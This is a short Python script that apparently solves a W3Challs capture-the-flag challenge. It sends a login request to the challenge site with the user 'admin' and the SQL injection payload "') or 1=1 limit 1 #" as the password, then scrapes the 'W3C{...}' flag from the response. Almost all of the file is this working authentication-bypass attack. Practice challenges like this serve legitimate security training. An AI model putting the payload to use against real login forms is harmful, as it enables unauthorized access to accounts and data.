from requests import *

url = 'http://databasic.hax.w3challs.com/'
data = {
    'login' : 'admin',
    'password' : "') or 1=1 limit 1 #"
}

r = post(url , data=data)
pos = r.text.find('W3C{')
while (True):
    print(r.text[pos] , end='')
    if (r.text[pos] == '}'):
        print()
        break
    pos += 1